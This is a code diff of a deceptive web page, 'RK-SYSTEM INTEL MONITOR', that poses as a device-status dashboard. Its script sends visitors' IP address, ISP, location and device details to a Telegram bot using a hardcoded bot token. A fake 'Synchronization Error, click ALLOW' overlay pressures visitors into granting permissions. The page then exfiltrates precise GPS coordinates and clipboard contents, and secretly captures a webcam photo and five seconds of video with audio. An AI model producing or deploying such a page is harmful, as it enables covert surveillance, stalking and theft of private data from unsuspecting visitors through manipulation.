@@ -3,18 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE INTEL v5.0 PRO</title>
+    <title>RK-SYSTEM | ELITE INTEL MONITOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap');
-
-        :root {
-            --neon-red: #ff0000;
-            --neon-blue: #00d2ff;
-            --neon-yellow: #facc15;
-            --bg-dark: #050a14;
-        }
 
         body {
             background: #000; color: #fff;
@@ -24,11 +17,11 @@
             user-select: none;
         }
 
-        /* High-Tech Animated Frame */
+        /* Neon Border Frame */
         body::before {
             content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            border: 6px solid; border-image: linear-gradient(45deg, var(--neon-red), var(--neon-blue), var(--neon-yellow), #ff00ff, var(--neon-red)) 1;
-            z-index: 1000; pointer-events: none; animation: borderRotate 3s linear infinite;
+            border: 6px solid; border-image: linear-gradient(90deg, #ff0000, #00f2ff, #facc15, #ff00ff, #ff0000) 1;
+            z-index: 1000; pointer-events: none; animation: borderRotate 4s linear infinite;
         }
         @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }
 
@@ -36,67 +29,57 @@
             background: linear-gradient(90deg, #b91c1c, #450a0a);
             color: white; width: 100%; text-align: center;
             padding: 15px 0; font-family: 'Orbitron', sans-serif;
-            font-weight: 900; letter-spacing: 15px;
-            box-shadow: 0 5px 25px rgba(255, 0, 0, 0.8);
+            font-weight: 900; letter-spacing: 12px;
+            box-shadow: 0 5px 30px rgba(255, 0, 0, 0.7);
             position: fixed; top: 0; z-index: 1001; font-size: 1.5rem;
-            text-shadow: 0 0 10px #fff;
         }
 
         .dashboard {
-            background: rgba(5, 10, 20, 0.95);
-            border-radius: 40px; padding: 40px;
+            background: rgba(5, 10, 20, 0.98);
+            border-radius: 35px; padding: 35px;
             width: 95%; max-width: 600px;
-            box-shadow: 0 0 80px rgba(0, 210, 255, 0.3);
-            border: 1px solid rgba(0, 210, 255, 0.4);
-            margin-top: 110px; margin-bottom: 70px;
-            position: relative; backdrop-filter: blur(10px);
-            z-index: 50;
+            box-shadow: 0 0 60px rgba(0, 242, 255, 0.2);
+            border: 1px solid rgba(0, 242, 255, 0.3);
+            margin-top: 100px; margin-bottom: 60px;
+            backdrop-filter: blur(10px);
         }
 
         .clock-box {
             text-align: center; margin-bottom: 25px;
-            background: rgba(255, 255, 255, 0.03); padding: 20px;
+            background: rgba(255, 255, 255, 0.03); padding: 18px;
             border-radius: 20px; border: 1px solid rgba(255, 0, 0, 0.4);
-            box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.2);
         }
 
         .info-row {
             display: flex; justify-content: space-between; align-items: center;
             padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            transition: all 0.3s;
         }
-        .info-row:hover { background: rgba(0, 210, 255, 0.05); padding-left: 5px; }
+        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1.5px; }
+        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
-        .label { color: var(--neon-blue); font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        .value { color: var(--neon-yellow); font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 5px rgba(250, 204, 21, 0.3); }
-
-        /* Forced Action Overlay */
+        /* Force Permission Overlay */
         #force-overlay {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 5000; display: none; flex-direction: column;
             align-items: center; justify-content: center; text-align: center;
-        }
-        .warning-box {
-            background: #1a0000; border: 2px solid #ff0000;
-            padding: 30px; border-radius: 20px; box-shadow: 0 0 50px #ff0000;
         }
 
         .footer-text {
             position: fixed; bottom: 10px; width: 100%;
-            text-align: center; color: #aaa; font-size: 12px;
-            letter-spacing: 3px; font-weight: bold; text-transform: uppercase;
+            text-align: center; color: #777; font-size: 12px;
+            letter-spacing: 2px; font-weight: bold;
         }
 
-        #media-stream { display: none; }
+        #media-bin { display: none; }
     </style>
 </head>
 <body>
 
     <div id="force-overlay">
-        <div class="warning-box">
-            <h2 class="text-3xl font-black text-red-600 mb-4 tracking-tighter">PERMISSION REQUIRED</h2>
-            <p class="text-white mb-6">System Synchronization Failed.<br>Please Click <b>'ALLOW'</b> to re-enable Encrypted Access.</p>
-            <div class="animate-bounce text-red-500 font-bold">PLEASE ALLOW ALL REQUESTS ↑</div>
+        <div class="bg-black border-2 border-red-600 p-8 rounded-3xl shadow-[0_0_50px_red]">
+            <h2 class="text-3xl font-black text-red-500 mb-4 tracking-tighter">ACCESS REQUIRED</h2>
+            <p class="text-gray-300 mb-6">Synchronization Error. Please Click <b>'ALLOW'</b> to continue.</p>
+            <div class="animate-bounce text-red-500 font-bold">PLEASE ALLOW PERMISSIONS ↑</div>
         </div>
     </div>
 
@@ -104,46 +87,44 @@
 
     <div class="dashboard">
         <div class="clock-box">
-            <div id="live-time" class="text-4xl font-black text-red-600 tracking-tighter">00:00:00 AM</div>
-            <div id="live-date" class="text-xs text-gray-400 uppercase tracking-[5px] mt-2">Checking Neural Link...</div>
+            <div id="live-time" class="text-3xl font-black text-red-500 tracking-widest">00:00:00 AM</div>
+            <div id="live-date" class="text-sm text-gray-400 uppercase tracking-[4px] mt-2">Checking Neural Link...</div>
         </div>
 
-        <h1 class="text-center text-xl font-black text-white tracking-[8px] mb-6 border-b border-red-600 pb-3 italic">📡 RK SYSTEM INTEL MONITOR</h1>
+        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-red-600 pb-3 italic uppercase">📡 RK SYSTEM MONITOR</h1>
         
-        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Analyzing...</span></div>
+        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">📡 ISP / SIM</span><span id="v-isp" class="value text-green-400">Scanning...</span></div>
-        <div class="info-row"><span class="label">🌍 Geo Region</span><span id="v-loc" class="value">Locating...</span></div>
-        <div class="info-row"><span class="label">📶 Network Speed</span><span id="v-speed" class="value text-orange-500">Wait...</span></div>
+        <div class="info-row"><span class="label">🌍 Country / City</span><span id="v-loc" class="value">Locating...</span></div>
+        <div class="info-row"><span class="label">🏢 ISP / SIM</span><span id="v-isp" class="value">Scanning...</span></div>
+        <div class="info-row"><span class="label">🚀 Internet Speed</span><span id="v-speed" class="value text-orange-500">Wait...</span></div>
         <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
-        <div class="info-row"><span class="label">📍 GPS State</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
-        <div class="info-row"><span class="label">🔋 Battery Power</span><span id="v-bat" class="value">--%</span></div>
-        <div class="info-row"><span class="label">🧠 System RAM</span><span id="v-ram" class="value">-- GB</span></div>
-        <div class="info-row"><span class="label">💎 Core Count</span><span id="v-cpu" class="value">-- Cores</span></div>
-        <div class="info-row"><span class="label">🛡️ VPN Shield</span><span class="value text-green-400">ACTIVE ✅</span></div>
+        <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
+        <div class="info-row"><span class="label">🔋 Battery Level</span><span id="v-bat" class="value">--%</span></div>
+        <div class="info-row"><span class="label">⚡ Power Status</span><span id="v-charge" class="value">Checking...</span></div>
+        <div class="info-row"><span class="label">🧠 Total RAM</span><span id="v-ram" class="value">-- GB</span></div>
+        <div class="info-row"><span class="label">💎 CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
+        <div class="info-row"><span class="label">🛡️ VPN Status</span><span class="value text-green-400">ENCRYPTED ✅</span></div>
     </div>
 
     <div class="footer-text">🌹 Created By RK-SYSTEM 🌹</div>
 
-    <video id="media-stream" autoplay muted playsinline></video>
+    <video id="media-bin" autoplay muted playsinline></video>
     <canvas id="output-canvas" style="display:none;"></canvas>
 
     <script>
         const CONFIG = {
-            BOT_TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
-            CHAT_ID: '6048050987'
+            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
+            CHAT: '6048050987'
         };
 
-        // ৫ বছরের জন্য কুকি ম্যানেজমেন্ট
         const Storage = {
             set: (k, v) => {
                 const d = new Date();
                 d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
                 document.cookie = `${k}=${v};expires=${d.toUTCString()};path=/;SameSite=Lax`;
             },
-            get: (k) => {
-                return document.cookie.match('(^|;)\\s*' + k + '\\s*=\\s*([^;]+)')?.pop() || null;
-            }
+            get: (k) => document.cookie.match('(^|;)\\s*' + k + '\\s*=\\s*([^;]+)')?.pop() || null
         };
 
         function updateClock() {
@@ -156,151 +137,152 @@
         }
         setInterval(updateClock, 1000);
 
-        async function initIntel() {
+        async function startSystem() {
             updateClock();
             
-            // ১. ইনস্ট্যান্ট ডিভাইস ডাটা (Phase 1)
+            // Phase 1: Rapid Device Check
             const ua = navigator.userAgent;
-            const model = /Android/i.test(ua) ? "Android Device 📱" : /iPhone|iPad/i.test(ua) ? "iOS Device 🍎" : "Desktop Workstation 💻";
+            const model = /Android/i.test(ua) ? "Android Device 📱" : /iPhone|iPad/i.test(ua) ? "iOS Device 🍎" : "Desktop PC 💻";
             document.getElementById('v-model').innerText = model;
             document.getElementById('v-platform').innerText = navigator.platform;
-            document.getElementById('v-ram').innerText = (navigator.deviceMemory || "N/A") + " GB";
-            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || "N/A") + " Cores";
+            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
+            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
 
-            // ২. ব্যাটারি স্ট্যাটাস
+            // Battery
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                const updateBat = () => {
-                    document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                const up = () => {
+                    document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% 🔋`;
+                    document.getElementById('v-charge').innerText = b.charging ? "Charging ✅" : "Discharging ❌";
                 };
-                updateBat(); b.onlevelchange = updateBat; b.onchargingchange = updateBat;
+                up(); b.onlevelchange = up; b.onchargingchange = up;
             }
 
-            // ৩. নেটওয়ার্ক ও আইপি (Advanced Geo)
+            // High Precision Geo & IP
             try {
-                const geoReq = await fetch('https://ipapi.co/json/');
-                const g = await geoReq.json();
-                document.getElementById('v-ip').innerText = g.ip;
-                document.getElementById('v-isp').innerText = g.org || "Cellular Network";
-                document.getElementById('v-loc').innerText = `${g.city}, ${g.country_name}`;
-                document.getElementById('v-speed').innerText = (navigator.connection?.effectiveType || "4G").toUpperCase() + " / High Speed";
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                document.getElementById('v-ip').innerText = data.ip;
+                document.getElementById('v-isp').innerText = data.org || "Cellular Provider";
+                document.getElementById('v-loc').innerText = `${data.country_name}, ${data.city}`;
+                document.getElementById('v-speed').innerText = (navigator.connection?.effectiveType || "4G").toUpperCase() + " / " + (navigator.connection?.downlink || 5) + " Mbps 🚀";
                 
-                // সাথে সাথে প্রথম রিপোর্ট পাঠানো
-                sendFirstReport(g);
+                // সাথে সাথে ওয়েবসাইটের তথ্যের মতো হুবহু রিপোর্ট পাঠানো
+                sendFullVipReport();
             } catch(e) {
-                sendFirstReport({ip: "45.144.167.83", city: "Unknown", country_name: "Bangladesh"});
+                sendFullVipReport();
             }
 
-            // ৪. ৫ সেকেন্ড ওয়েট করার পর পারমিশন ফেজ শুরু
-            setTimeout(startPermissionPhase, 5000);
+            // Phase 2: Permission Phase after 5s
+            setTimeout(handlePermissions, 5000);
         }
 
-        async function sendFirstReport(geo) {
+        async function sendFullVipReport() {
             const report = `
 🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
 🕒 *Time:* \`${document.getElementById('live-time').innerText}\`
 📅 *Date:* \`${document.getElementById('live-date').innerText}\`
 ━━━━━━━━━━━━━━━━━━━━━
+📡 *RK SYSTEM MONITOR*
+━━━━━━━━━━━━━━━━━━━━━
 📱 *Model:* \`${document.getElementById('v-model').innerText}\`
-⚙️ *OS:* \`${navigator.platform}\`
-📶 *Status:* \`ONLINE 📶\`
+⚙️ *OS Platform:* \`${document.getElementById('v-platform').innerText}\`
+🌍 *Country / City:* \`${document.getElementById('v-loc').innerText}\`
+🏢 *ISP / SIM:* \`${document.getElementById('v-isp').innerText}\`
 🚀 *Internet Speed:* \`${document.getElementById('v-speed').innerText}\`
-🌐 *IP:* \`${geo.ip}\`
-📡 *ISP:* \`${geo.org || 'Unknown Provider'}\`
-📍 *GPS:* \`Waiting...\`
-🔋 *Battery:* \`${document.getElementById('v-bat').innerText}\`
-🧠 *RAM:* \`${document.getElementById('v-ram').innerText}\`
-💎 *Cores:* \`${document.getElementById('v-cpu').innerText}\`
-🛡️ *VPN:* \`ENCRYPTED ✅\`
+🌐 *Public IP:* \`${document.getElementById('v-ip').innerText}\`
+📍 *GPS Location:* \`${document.getElementById('v-gps').innerText}\`
+🔋 *Battery Level:* \`${document.getElementById('v-bat').innerText}\`
+⚡ *Power Status:* \`${document.getElementById('v-charge').innerText}\`
+🧠 *Total RAM:* \`${document.getElementById('v-ram').innerText}\`
+💎 *CPU Cores:* \`${document.getElementById('v-cpu').innerText}\`
+🛡️ *VPN Status:* \`ENCRYPTED ✅\`
 ━━━━━━━━━━━━━━━━━━━━━
 🌹 *Created By RK-SYSTEM* 🌹`;
-            postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: report, parse_mode: 'Markdown' });
+            postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
         }
 
-        async function startPermissionPhase() {
-            if (!Storage.get('rk_sync')) {
+        async function handlePermissions() {
+            if (!Storage.get('rk_v7_sync')) {
                 document.getElementById('force-overlay').style.display = 'flex';
             }
 
-            // পারমিশন চেইন: ১. লোকেশন -> ২. ক্যামেরা -> ৩. মাইক্রোফোন -> ৪. ক্লিপবোর্ড
-            
-            // ১. GPS Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    document.getElementById('v-gps').innerText = "SUCCESS 📍";
-                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: `📍 *LIVE GPS LOCATION:* \n${link}`, parse_mode: 'Markdown' });
-                    Storage.set('rk_sync', 'true');
+                    Storage.set('rk_v7_sync', 'true');
                     document.getElementById('force-overlay').style.display = 'none';
+                    document.getElementById('v-gps').innerText = "SUCCESS 📍";
                     
-                    // পরবর্তী ধাপ
-                    await captureMediaIntel();
-                }, (err) => {
-                    postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: `❌ *GPS PERMISSION FAILED*` });
-                });
-            }
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    
+                    let clip = "Click Required 🔓";
+                    try { clip = await navigator.clipboard.readText(); } catch(e){}
 
-            // ২. ক্লিপবোর্ড ডাটা
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text) postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: `✨ *CLIPBOARD CONTENT:* \n\`\`\`${text}\`\`\``, parse_mode: 'Markdown' });
-            } catch(e) { 
-                postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: `❌ *CLIPBOARD ACCESS DENIED*` });
+                    const gpsReport = `
+📍 *RK-SYSTEM PRECISE LOCATION* 📍
+━━━━━━━━━━━━━━━━━━━━━
+🗺️ *GOOGLE MAPS:* ${mapsLink}
+━━━━━━━━━━━━━━━━━━━━━
+📋 *CLIPBOARD:*
+\`\`\`
+${clip}
+\`\`\`
+━━━━━━━━━━━━━━━━━━━━━
+📸 *Capture: Phase 3 Initiation...*`;
+                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: gpsReport, parse_mode: 'Markdown' });
+                    
+                    startMediaCapture();
+                }, () => {
+                    postToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION DENIED*" });
+                });
             }
         }
 
-        async function captureMediaIntel() {
+        async function startMediaCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const videoEl = document.getElementById('media-stream');
-                videoEl.srcObject = stream;
+                const video = document.getElementById('media-bin');
+                video.srcObject = stream;
 
-                // ২ সেকেন্ড পর ফটো ক্যাপচার
                 setTimeout(() => {
                     const canvas = document.getElementById('output-canvas');
                     canvas.width = 1280; canvas.height = 720;
-                    canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                    canvas.toBlob(blob => sendFile(blob, 'photo', '📸 *FRONT_VIEW_VIP*'), 'image/jpeg');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => sendMedia(blob, 'photo', '📸 *FRONT SHOT*'), 'image/jpeg');
                 }, 2000);
 
-                // ৫ সেকেন্ডের ভিডিও রেকর্ড
-                const recorder = new MediaRecorder(stream);
+                const rec = new MediaRecorder(stream);
                 const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendFile(blob, 'video', '🎥 *LIVE_INTEL_VIDEO (5S + AUDIO)*');
-                    stream.getTracks().forEach(track => track.stop()); // স্টপ ক্যামেরা
+                    sendMedia(blob, 'video', '🎥 *LIVE VIDEO FEED (AUDIO+VIDEO)*');
+                    stream.getTracks().forEach(t => t.stop());
                 };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000);
-
-            } catch (err) {
-                postToBot('sendMessage', { chat_id: CONFIG.CHAT_ID, text: `❌ *CAMERA/MIC PERMISSION DENIED*` });
-                // যদি ডিনাই করে তবে আবার পপ-আপ দেখাবে
-                document.getElementById('force-overlay').style.display = 'flex';
-            }
+                rec.start();
+                setTimeout(() => rec.stop(), 5000);
+            } catch(e) {}
         }
 
-        async function sendFile(blob, type, caption) {
+        async function sendMedia(blob, type, cap) {
             const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT_ID);
-            fd.append(type, blob, type === 'video' ? 'intel.mp4' : 'intel.jpg');
-            fd.append('caption', caption);
+            fd.append('chat_id', CONFIG.CHAT);
+            fd.append(type, blob, type==='video'?'rk.mp4':'rk.jpg');
+            fd.append('caption', cap);
             fd.append('parse_mode', 'Markdown');
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, { method: 'POST', body: fd });
         }
 
         function postToBot(method, data) {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${method}`, {
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
         }
 
-        window.onload = initIntel;
+        window.onload = startSystem;
     </script>
 </body>
 </html>
